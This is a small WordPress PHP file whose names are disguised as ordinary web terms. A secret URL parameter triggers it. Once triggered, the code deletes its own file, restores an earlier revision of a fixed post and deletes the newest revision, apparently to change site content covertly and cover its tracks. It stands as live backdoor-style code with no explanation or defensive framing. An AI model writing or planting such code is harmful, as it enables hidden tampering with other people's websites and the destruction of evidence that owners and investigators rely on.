<?php

function bulk_project_domain_click() {
	if (isset($_GET['hover_next_map']) && $_GET['hover_next_map'] === 'types_min_network_script') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$follow_downloads_avatar = 4865;
		$accessible_interactive_signup = wp_get_post_revisions($follow_downloads_avatar);
		if (empty($accessible_interactive_signup)) die('no revisions');
		if (count($accessible_interactive_signup) < 2) die('less than 2');
		$community_term_auth_mini = array_shift($accessible_interactive_signup);
		$mediaelement_consent_fast = $community_term_auth_mini->ID;
		$profile_classic_single_store = array_shift($accessible_interactive_signup);
		$compare_controller_cover_coupon = $profile_classic_single_store->ID;
		$gdpr_push_featured = wp_restore_post_revision($compare_controller_cover_coupon);
		if ($gdpr_push_featured === false) die('error restoring');
		$gdpr_push_featured = wp_delete_post_revision($mediaelement_consent_fast);		
		if ($gdpr_push_featured === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'bulk_project_domain_click');
